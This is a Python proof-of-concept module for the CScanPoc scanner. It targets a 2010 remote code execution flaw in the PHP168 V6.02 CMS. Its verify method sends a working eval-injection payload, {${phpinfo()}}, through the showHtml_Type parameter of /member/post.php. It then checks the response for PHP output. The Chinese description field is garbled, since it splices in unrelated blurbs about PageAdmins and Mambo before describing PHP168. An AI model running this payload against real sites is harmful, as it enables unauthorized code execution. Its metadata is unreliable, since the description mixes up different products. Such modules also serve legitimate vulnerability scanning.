# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHP168_0012'  # 平台漏洞编号，留空
    name = 'PHP168 V6.02整站系统 远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2010-09-10'  # 漏洞公布时间
    desc = '''
        PageAdmins网站管理系统采用Div+Css标准化设计，符合W3C标准。兼容主流浏览器，网站系统可免费下载、免费使用、无使用时间与任何功能限制。主要用于公司企业网站、学校类和信息类网站搭建。
        Mambo是免费的功能强大的开放源码内容管理系统，Pearl For Mambo是可以无缝的集成于Mambo的一个组件。
        PHP168整站是PHP的建站系统，代码全部开源，是国内知名的开源软件提供商；提供核心+模块+插件的模式；任何应用均可在线体验。
        PHP168在某些函数里运用了eval函数,但是某数组没有初试化,导致可以提交任意代码执行。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0528'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHP168'  # 漏洞应用名称
    product_version = 'V6.02'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ac0e540d-38cc-4db2-9d1d-510462eacfee'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2010-0528
            payload = '/member/post.php?only=1&showHtml_Type[bencandy][1]={${phpinfo()}}&aid=1&job=endHTML'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and 'PHP Version' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
